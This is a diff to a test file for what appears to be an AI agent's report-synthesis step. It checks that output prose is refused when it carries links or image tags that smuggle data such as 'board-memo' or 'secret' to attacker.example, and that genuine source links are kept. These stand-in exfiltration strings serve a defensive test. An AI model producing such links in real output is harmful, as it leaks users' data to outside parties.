@@ -396,10 +396,26 @@ describe("executeSynthesis — links and images in the prose", () => {
     ["a link to an unknown site", "See [the report](https://attacker.example/login)."],
     ["a bare unknown URL", "Details at https://attacker.example/?q=board-memo today."],
     ["a reference-style link", "See [the report][r].\n\n[r]: https://attacker.example/r"],
+    // An upstream page may itself be the attacker's: a known URL is safe only as it was returned.
+    ["a known URL with data appended", `See ${SOURCE_A.url}?d=board-memo.`],
+    ["a known URL with a path appended", `See ${SOURCE_A.url}/../x?d=1.`],
+    ["a www. address", "Details at www.attacker.example/?d=secret today."],
+    ["a protocol-relative image tag", "<img src=//attacker.example/p.png?d=1>"],
+    ["a protocol-relative anchor", '<a href="//attacker.example">the report</a>'],
   ])("refuses %s", async (_label, prose) => {
     const err = await synthesize(prose);
     expect(err).toBeInstanceOf(InvalidAgentOutputError);
     expect((err as Error).message).toContain("section 'intro'");
+  });
+
+  test.each([
+    ["an angle-bracket destination", `Per [Precedent A](<${SOURCE_A.url}>), margins held.`],
+    ["a link title", `Per [Precedent A](${SOURCE_A.url} "Reuters"), margins held.`],
+    ["a bare URL ending a sentence", `Margins held (see ${SOURCE_A.url}).`],
+    ["a bare URL before a full stop", `Margins held, per ${SOURCE_A.url}.`],
+  ])("keeps %s to an upstream source", async (_label, prose) => {
+    const result = (await synthesize(prose)) as { sections: { content_markdown: string }[] };
+    expect(result.sections?.[0]?.content_markdown).toBe(prose);
   });
 
   test("a link to an upstream source is kept", async () => {
